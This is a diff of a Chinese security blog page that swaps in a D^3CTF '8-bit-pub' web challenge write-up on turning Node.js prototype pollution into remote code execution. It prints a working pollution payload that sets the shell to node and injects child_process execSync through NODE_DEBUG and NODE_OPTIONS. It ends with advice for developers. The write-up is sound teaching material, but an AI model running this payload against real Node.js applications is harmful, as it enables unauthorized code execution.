class="string">"s%3Asis-4wQQfN9QjaqEJAhBIL4iPP_e-qnr.p1CqQc3RiekkFz5FYzBRR9%2BO3j%2FIUX0vPh2sdkcuMk8"</span></span><br><span class="line">&#125;)</span><br><span class="line">print(r.json())</span><br></pre></td></tr></table></figure>
+
+
+<p>当然。如果不想找污染到rce的属性时，还有一个通法。就是我在NCTF2020 中出的<a href="https://github.com/baiyecha404/My-NCTF2020-Challs/tree/master/PackageManager_v2.0" target="_blank" rel="noopener">packagemanager_v2.0 </a> 里的利用</p>
+<p>当时提到过了。到基类的污染+ 任意子进程 = RCE。这里无脑直接污染环境变量当然是可以的</p>
+<p>改下就行</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"constructor.prototype.sendmail"</span>: True,</span><br><span class="line"><span class="string">"constructor.prototype.shell"</span>:<span class="string">"node"</span>,</span><br><span class="line"><span class="string">"constructor.prototype.env.NODE_DEBUG"</span>: <span class="string">"require('child_process').execSync('curl 127.0.0.1');process.exit();//"</span>,</span><br><span class="line"><span class="string">"constructor.prototype.env.NODE_OPTIONS"</span>:<span class="string">"-r /proc/self/environ"</span>,</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://hackmd.summershrimp.com/uploads/upload_790c9ee4c7ba0655f6129ea9eadb61bd.png" class="lazyload" data-srcset="https://hackmd.summershrimp.com/uploads/upload_790c9ee4c7ba0655f6129ea9eadb61bd.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p>
+<p>远程nc打通<br><img src="https://hackmd.summershrimp.com/uploads/upload_09312849190b675cac32392d97e0db1c.png" class="lazyload" data-srcset="https://hackmd.summershrimp.com/uploads/upload_09312849190b675cac32392d97e0db1c.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p>
+<p>由于题目打一次后数据库就会报错,只要完成第一步以admin登录的选手应该都能在登录时看到他人的payload。所以可能会有蹭车。</p>
+<h2 id="summary"><a href="#summary" class="headerlink" title="summary"></a>summary</h2><p>总的来说这道题难度一般。但是利用点其实都是比较经典的。所以值得分享一下。也提醒我们从开发的角度上，一方面在打开了json中间件或者<code>{extended： true}</code>的情况下一定要注意传参类型。另一方面也是避免使用用量低的node依赖,否则可能会存在一些未修复完全或者甚至根本不修复的代码。比如 此处没修复完全的shvl 的情形甚至都不是个例。之前 posix挖到的flat 依赖 原型链污染第一次修复的版本跟这里出现了几乎一样的问题,导致可以<code>prototype</code>绕过。。。</p>
+<p>最后就是关于RCE。 nodejs里想借由漏洞达成RCE确实不是一件简单的事情，基本上就参数注入，或者原型链污染 + gadget/ AST injection. 这也是为什么原型链污染始终是nodejs漏洞热门的原因。 之前注意到posix他们已经研究出了自动挖掘原型链污染的工具了,属实羡慕。。。</p>
 
   
   
@@ -533,7 +536,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
               
             
               
-                <p>本文永久链接是：<a href=https://www.bycsec.top/2020/01/12/hackthebox-Wall/>https://www.bycsec.top/2020/01/12/hackthebox-Wall/</a></p>
+                <p>本文永久链接是：<a href=https://www.bycsec.top/2021/03/06/D^3CTF-8-bit-pub/>https://www.bycsec.top/2021/03/06/D^3CTF-8-bit-pub/</a></p>
               
             
           </blockquote>
@@ -558,10 +561,10 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     <div class='new-meta-box'>
       
         
-          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2021-02-18T13:09:30+08:00">
+          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2021-03-08T19:29:35+08:00">
   <a class='notlink'>
     <i class="fas fa-edit fa-fw" aria-hidden="true"></i>
-    <p>更新于：Feb 18, 2021</p>
+    <p>更新于：Mar 8, 2021</p>
   </a>
 </div>
 
@@ -570,7 +573,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
         
           
   
-  <div class="new-meta-item meta-tags"><a class="tag" href="/tags/hackthebox/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>hackthebox</p></a></div> <div class="new-meta-item meta-tags"><a class="tag" href="/tags/pentest/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>pentest</p></a></div>
+  <div class="new-meta-item meta-tags"><a class="tag" href="/tags/WEB/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>WEB</p></a></div> <div class="new-meta-item meta-tags"><a class="tag" href="/tags/wp/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>wp</p></a></div> <div class="new-meta-item meta-tags"><a class="tag" href="/tags/Node-js/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>Node.js</p></a></div>
 
 
         
@@ -585,11 +588,12 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
   
     <div class="prev-next">
       
-        <a class='prev' href='/2020/01/13/GXYCTF-PingPingPing-BabySqli/'>
-          <p class='title'><i class="fas fa-chevron-left" aria-hidden="true"></i>GXYCTF--PingPingPing&BabySqli</p>
-          <p class='content'>  说来惭愧，之前12月份初报了GWYCTF,结果到了比赛的时候又因为复习忙的焦头烂额，所以一道题目都没看。刚好因为题目难度是针对校内招新的，我就现在复现下吧：题目复现地址：https://bu...</p>
-        </a>
       
+        <a class='next' href='/2021/02/07/golang%E7%9A%84%E4%B8%80%E4%BA%9B%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/'>
+          <p class='title'>golang的一些安全问题<i class="fas fa-chevron-right" aria-hidden="true"></i></p>
+          <p class='content'>寒假主要是先出完了之前心心念念的typescript 题目，之后主要是抽点时间学golang.同学推荐的仓库讲的还是很不错的
+https://github.com/unknwon/the-way...</p>
+        </a>
       
     </div>
   
@@ -631,7 +635,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 
 
     <div class='content'>
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#拿-user-权限"><span class="toc-text">拿 user 权限</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#拿-root-权限"><span class="toc-text">拿 root 权限</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#analysis"><span class="toc-text">analysis</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#prototype-pollution-to-RCE"><span class="toc-text">prototype pollution to RCE</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exploit"><span class="toc-text">exploit</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#summary"><span class="toc-text">summary</span></a></li></ol>
     </div>
   </section>
 
@@ -650,7 +654,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 <script>
   window.pdata={}
   pdata.ispage=true;
-  pdata.postTitle="hackthebox-Wall";
+  pdata.postTitle="D^3CTF 8-bit-pub";
   pdata.commentPath="";
   pdata.commentPlaceholder="";
   // header 这里无论是否开启pjax都需要
